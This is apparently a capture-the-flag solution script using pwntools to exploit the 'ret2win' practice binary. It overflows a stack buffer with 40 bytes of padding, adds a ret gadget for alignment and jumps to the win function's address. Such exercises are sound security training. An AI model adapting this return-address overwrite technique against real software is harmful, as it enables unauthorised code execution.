#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
 
payload = cyclic(40, n=8) # 32 bytes of the buffer and 8 bytes for rbp
payload += p64(0x000000000040053e) # the extra ret instruction
payload += p64(0x0000000000400756) # the address of the ret2win function

p = process("./ret2win")
p.send(payload)
p.interactive()


















